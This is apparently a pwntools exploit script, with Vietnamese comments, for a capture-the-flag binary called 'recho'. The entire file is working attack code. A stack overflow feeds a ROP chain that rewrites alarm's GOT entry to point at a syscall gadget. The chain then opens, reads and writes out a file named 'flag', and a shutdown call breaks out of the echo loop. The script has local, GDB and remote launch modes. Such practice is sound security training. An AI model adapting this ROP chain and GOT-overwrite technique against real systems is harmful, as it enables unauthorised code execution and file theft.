from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
b* 0x0000000000400834
continue
'''.format(**locals())

#Binary filename
exe = './recho'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()

#bai nay tim string co chu flag -> tan dung
# string flag tai vi tri 0x601058 -> thieu syscall de open
# co o ben alarm.got + 5 co syscall do do thay alarm got + 5 thanh dia chi
# syscall 

# ak con dieu dac biet nua la thoat khoi vong lap 
# dung PWN co func shutdown() -> perfect

pop_rax = 0x00000000004006fc
pop_rdi = 0x00000000004008a3
pop_rdx = 0x00000000004006fe
pop_rsi_r15 = 0x00000000004008a1

addr = 0x000000000040070d #add PTR[rdi], al

bss = elf.bss()
flag = 0x601058

p.recvuntil(b"Welcome to Recho server!\n")
p.sendline(str(0x200))

#doi dia chi elf.got['alarm'] -> syscall
payload = b"a"*0x38
payload += p64(pop_rdi) + p64(elf.got['alarm'])
payload += p64(pop_rax) + p64(5)
payload += p64(addr)

#co syscall, open thoi (https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)
payload += p64(pop_rax) + p64(2)
payload += p64(pop_rdi) + p64(flag)
payload += p64(pop_rsi_r15) + p64(0) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(elf.plt['alarm'])

#read
payload += p64(pop_rdi) + p64(3)
payload += p64(pop_rsi_r15) + p64(bss) + p64(0)
payload += p64(pop_rdx) + p64(0x30)
payload += p64(elf.plt['read'])

#write
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(bss) + p64(0)
payload += p64(pop_rdx) + p64(0x30)
payload += p64(elf.plt['write'])

p.send(payload.ljust(0x200, b"\x00"))
p.recv()
p.shutdown('send')


p.interactive()
